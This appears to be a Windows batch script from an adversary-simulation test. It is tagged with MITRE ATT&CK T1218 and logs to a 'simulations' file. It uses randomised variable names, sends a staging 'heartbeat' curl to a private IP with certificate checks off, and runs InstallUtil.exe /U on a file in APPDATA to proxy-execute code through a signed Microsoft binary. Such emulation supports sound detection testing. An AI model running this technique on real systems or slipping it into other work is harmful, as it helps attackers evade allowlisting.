@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET tsvar=!DATE!/!TIME!
SET pjkcpgw=%APPDATA%\9789\9270749b
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9789-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=project.txt
SET ewjmdkff=9789
SET lgfnwl=%APPDATA%\!pudaazx!\macula-simulations.log

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start>> "!lgfnwl!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_complete>> "!lgfnwl!" 2>nul

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start>> "!lgfnwl!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
SET eres=!errorlevel!
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=!eres!>> "!lgfnwl!" 2>nul

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: installutil_start>> "!lgfnwl!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!syjfr!" >NUL 2>&1
SET ires=!errorlevel!

SET ttp_result=1
SET ttp_err=
if !ires! NEQ 0 (
  SET ttp_result=0
  SET ttp_err=execution_failed
)
echo [!DATE:/=-! !TIME:.=,!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed Binary Proxy Execution InstallUtil=!ttp_result!:!ttp_err!>> "!lgfnwl!" 2>nul
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: installutil_result=!ires!>> "!lgfnwl!" 2>nul
ENDLOCAL